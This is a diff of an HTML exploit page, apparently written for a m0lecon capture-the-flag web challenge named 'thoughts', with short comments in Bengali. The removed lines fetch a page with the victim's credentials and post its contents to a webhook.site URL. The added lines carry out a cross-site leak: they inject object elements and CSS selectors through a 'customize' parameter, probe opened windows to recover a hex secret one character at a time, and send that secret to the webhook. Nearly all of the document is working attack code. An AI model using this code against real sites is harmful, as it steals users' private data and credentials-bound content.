@@ -1,12 +1,47 @@
+<!DOCTYPE html>
+<html>
+<body>
 <script>
-fetch("https://thoughts.challs.m0lecon.it/thoughts", { credentials: "include" })
-  .then(r => r.text())
-  .then(t => {
-    fetch("https://webhook.site/dab93e6e-4b06-4c84-b648-9e038c8ee27b", {
-      method: "POST",
-      mode: "no-cors",
-      body: t
-    });
-  });
-</script>
+const APP_URL = 'https://thoughts.challs.m0lecon.it/';  // বা তোমার instance IP/hostname
+const WEBHOOK = 'https://webhook.site/dab93e6e-4b06-4c84-b648-9e038c8ee27b'; // <-- এটা তোমার webhook/site URL
 
+function object_gen(){
+    let res = [];
+    let hex_c = "0123456789abcdef"
+    for (let i of hex_c){
+        res.push(`<object name="p-${i}" data="about:blank;"></object>`)
+    }
+    return res.join("\n")
+}
+function css_gen(prefix){
+    let res = ["<style>"];
+    let hex_c = "0123456789abcdef"
+    for (let i of hex_c){
+        res.push(`body[secret^="${prefix}${i}"] object[name="p-${i}"] { display:none; }`)
+    }
+    res.push("</style>")
+    return res.join("\n")
+}
+async function probe(w){
+    let hex_c = "0123456789abcdef"
+    for (let i of hex_c){
+        try { let _x = w[`p-${i}`] } catch { return i }
+    }
+    return -1
+}
+async function leak() {
+  let obj_elm = object_gen()
+  let leaked = ""
+  for(let i = 0; i < 6; i++){
+    let style_elm = css_gen(leaked)
+    const customizePayload = encodeURIComponent(obj_elm+style_elm+`<meta http-equiv=refresh content=1>`);
+    const w = window.open(`${APP_URL}/?customize=${customizePayload}`, '_blank');
+    await new Promise(resolve => setTimeout(resolve, 1650));
+    leaked += await probe(w)
+  }
+  fetch(WEBHOOK+"?secret="+leaked)
+}
+leak();
+</script>
+</body>
+</html>
